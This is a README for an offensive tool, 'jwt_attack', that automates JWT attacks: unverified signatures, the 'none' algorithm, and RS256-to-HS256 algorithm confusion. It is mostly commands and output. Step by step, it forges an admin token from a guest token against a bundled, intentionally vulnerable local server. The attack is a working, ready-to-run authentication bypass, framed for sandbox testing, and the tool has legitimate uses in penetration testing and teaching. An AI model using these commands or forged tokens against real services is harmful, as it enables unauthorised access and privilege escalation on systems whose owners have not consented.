# JWT Attack

Tool for attacking JWT implementations.

# How it works

You pass a working curl statement to `jwt_attack` (along with the key if you have it), and it will extract the JWT and perform a number of attacks.

# Setup

```bash
git clone git@github.com:fx2301/jwt_attack.git
cd jwt_attack
pip install -r requirements.txt
```

# Examples

Both are examples of attacking an endpoint vulnerable to algorithm confusion (tricking the implementation into using HS256 with a known RSA public key).

# Concise example

This is the final step of the attack. `jwt_attack` demonstrates that the existing payload is valid when changed to an HS256 algorithm, then outputs a curl statement with the desired target payload:

```bash
python3 jwt_attack.py --key-file public.key --target-payload '{"username":"admin"}' curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiUlMyNTYifQ.eyJ1c2VybmFtZSI6ICJndWVzdCJ9.dEYHdN8blOLC3AAdM2WLuaSoeh2mXUkS4Adjzroq8ED7E2n1ZwUGV9Qw9u3mb905cPo4pAb410OW1Oik0KY1BQ'
```

outputs:
```
Testing for identical results...
Attempting attack: signature not verified ... FAILURE
Attempting attack: none algorithm allowed ... FAILURE
Attempting attack: algorithm confusion ... SUCCESS

Successful JWT:
{
  "token": "eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.T7RHNDdo5vGxNZH4vKwpyOCL01sDC3bvR_wMWf8xPMk",
  "header": {
    "alg": "HS256"
  },
  "payload": {
    "username": "admin"
  },
  "signature": "T7RHNDdo5vGxNZH4vKwpyOCL01sDC3bvR_wMWf8xPMk"
}

Successful curl command:
curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.T7RHNDdo5vGxNZH4vKwpyOCL01sDC3bvR_wMWf8xPMk'
```

## Full example

1. First we obtain a valid curl request protected by a JWT. In this case we are constructing a curl request from the [vulnerable server](https://github.com/fx2301/jwt_attack/blob/master/vulnerable.py):

```bash
curl http://localhost:5000/alg_confusion
```

outputs:
```html
<p>A valid authorization header is: <code>eyJhbGciOiAiUlMyNTYifQ.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJpYXQiOiAxNjQyNTkwMzAxfQ.ZCIHzrTsu8RF1pE2FuDALmL2CR2MU4b-UoqOHva9itwxjq1oAUzkZ6PY7CpzvtQuQkNvVVB4if4LIgh3X8sABQ</code>. Now assume the username admin.</p><p>You have two approaches for obtaining the public key:<ol><li>Download the public key here: <a href="/alg_confusion_public_key">/alg_confusion_public_key</a>.</li><li>Derive the public key using <a href="https://github.com/silentsignal/rsa_sign2n/tree/release/standalone">https://github.com/silentsignal/rsa_sign2n/tree/release/standalone</a>.</li></ol></p>
```

2. We verify that our curl statement is valid:
```bash
curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiUlMyNTYifQ.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJpYXQiOiAxNjQyNTkwMzAxfQ.ZCIHzrTsu8RF1pE2FuDALmL2CR2MU4b-UoqOHva9itwxjq1oAUzkZ6PY7CpzvtQuQkNvVVB4if4LIgh3X8sABQ'
```

outputs:
```html
<p>Not quite. Your username needs to be admin.</p>
```

3. We inspect our token using `jwt_attack` with `--inspect`:

```bash
python3 jwt_attack.py --inspect curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiUlMyNTYifQ.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJpYXQiOiAxNjQyNTkwMzAxfQ.ZCIHzrTsu8RF1pE2FuDALmL2CR2MU4b-UoqOHva9itwxjq1oAUzkZ6PY7CpzvtQuQkNvVVB4if4LIgh3X8sABQ'
```

We see the `alg` is `RS256` as expected:
```
Token is:
{
  "token": "eyJhbGciOiAiUlMyNTYifQ.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJpYXQiOiAxNjQyNTkwMzAxfQ.ZCIHzrTsu8RF1pE2FuDALmL2CR2MU4b-UoqOHva9itwxjq1oAUzkZ6PY7CpzvtQuQkNvVVB4if4LIgh3X8sABQ",
  "header": {
    "alg": "RS256"
  },
  "payload": {
    "username": "guest",
    "iat": 1642590301
  },
  "signature": "ZCIHzrTsu8RF1pE2FuDALmL2CR2MU4b-UoqOHva9itwxjq1oAUzkZ6PY7CpzvtQuQkNvVVB4if4LIgh3X8sABQ"
}
```

4. We obtain the public key used from [/alg_confusion_public_key](http://localhost:5000/alg_confusion_public_key):

```bash
curl http://localhost:5000/alg_confusion_public_key -o public.key
```

5. Now we attack the implementation using --key-file and --target-payload:
```bash
python3 jwt_attack.py --key-file public.key --target-payload '{"username":"admin"}' curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiUlMyNTYifQ.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJpYXQiOiAxNjQyNTkwMzAxfQ.ZCIHzrTsu8RF1pE2FuDALmL2CR2MU4b-UoqOHva9itwxjq1oAUzkZ6PY7CpzvtQuQkNvVVB4if4LIgh3X8sABQ'
```

The attack succeeds, and we see the resulting JWT contents and curl statement:
```
Testing for identical results...
Attempting attack: signature not verified ... FAILURE
Attempting attack: none algorithm allowed ... FAILURE
Attempting attack: algorithm confusion ... SUCCESS

Successful JWT:
{
  "token": "eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.y-h_ZX0UQrajllr9f9xEso4FkL8AFCui5et-Qbg8u10",
  "header": {
    "alg": "HS256"
  },
  "payload": {
    "username": "admin"
  },
  "signature": "y-h_ZX0UQrajllr9f9xEso4FkL8AFCui5et-Qbg8u10"
}

Successful curl command:
curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.y-h_ZX0UQrajllr9f9xEso4FkL8AFCui5et-Qbg8u10'
```

7. We now verify the successful curl command:
```bash
curl http://localhost:5000/alg_confusion -H 'Authorization: eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.y-h_ZX0UQrajllr9f9xEso4FkL8AFCui5et-Qbg8u10'
```

```html
<p>Success! Your username is admin.</p>
```

# Sanbox testing

This repository comes with a HTTP service that exposes endpoints you can test with:

* [/signature_not_verified](http://localhost:5000/signature_not_verified)
* [/alg_none_allowed](http://localhost:5000/alg_none_allowed)
* [/alg_confusion](http://localhost:5000/alg_confusion) see also  [/alg_confusion_public_key](http://localhost:5000/alg_confusion_public_key)
* [/not_vulnerable](http://localhost:5000/not_vulnerable)

Run it with:

```bash
pip install -r requirements.txt
python3 vulnerable.py
```




